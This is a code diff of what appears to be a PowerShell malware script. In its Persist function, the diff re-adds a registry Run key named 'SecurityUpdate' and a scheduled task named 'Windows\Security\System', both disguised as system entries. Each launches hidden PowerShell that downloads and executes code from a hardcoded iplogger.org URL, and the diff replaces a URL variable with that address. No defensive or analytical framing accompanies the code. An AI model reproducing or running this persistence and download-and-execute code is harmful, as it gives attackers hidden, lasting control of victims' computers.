@@ -31,10 +31,10 @@ $consolePtr = [Console.Window]::GetConsoleWindow()
 function Persist {
   
         reg delete HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run /v SecurityUpdate /f
-        reg add HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run /v SecurityUpdate /t REG_SZ /d "powershell.exe -noni -W Hidden -nop -c iex (New-Object Net.WebClient).DownloadString('$PersistUrl')" 
+        reg add HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run /v SecurityUpdate /t REG_SZ /d "powershell.exe -noni -W Hidden -nop -c iex (New-Object Net.WebClient).DownloadString('https://iplogger.org/2jaZG6')" 
         
         schtasks /delete /tn "Windows\Security\System" /f
-        schtasks /create /tn "Windows\Security\System" /sc onidle /i 10 /tr "C:\Windows\System32\cmd.exe  /c powershell.exe -noni -W Hidden -nop -c iex (New-Object Net.WebClient).DownloadString('$PersistUrl')" 
+        schtasks /create /tn "Windows\Security\System" /sc onidle /i 10 /tr "C:\Windows\System32\cmd.exe  /c powershell.exe -noni -W Hidden -nop -c iex (New-Object Net.WebClient).DownloadString('https://iplogger.org/2jaZG6')" 
         schtasks /run /tn "Windows\Security\System"
 
         $checkPersist = reg query HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run | Select-String SecurityUpdate
